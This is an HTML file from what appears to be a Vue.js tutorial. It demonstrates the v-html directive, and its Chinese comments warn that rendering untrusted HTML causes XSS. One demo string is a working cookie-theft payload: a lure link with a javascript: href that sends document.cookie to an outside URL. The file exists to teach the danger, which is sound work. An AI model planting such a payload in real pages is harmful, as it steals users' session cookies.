<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>v-html指令</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
    <!-- 阻止 Vue 在启动时生成生产提示 -->
    <script type="text/javascript">Vue.config.productionTip = false</script>
</head>
<body>
    <!-- 
        v-html指令：
            1. 作用：向指定节点中渲染包括html结构的内容
            2. 与插值语法的区别：
                (1).v-html会替换掉节点中的所有内容，{{xxx}}则不会
                (2).v-html可以识别html结构
            3.严重注意：v-html有安全性问题！！！
                (1).在网站上动态渲染任意html是非常危险的，容易导致xss攻击
                (2).一定要在可信的内容上使用v-html，永远不要用在用户提交的内容上
     -->

    <!-- 准备好一个容器 -->
    <div id="root">
        <div>Hello,{{ name }}</div>
        <div v-html="str1"></div>
        <div v-html="str2"></div>
    </div>

    <script type="text/javascript">
        const vm = new Vue({
            el: "#root",
            data: {
                name: 'Turbo',
                str1: '<h3>Hello!</h3>',
				str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>'
            }
        })
    </script>
</body>
</html>
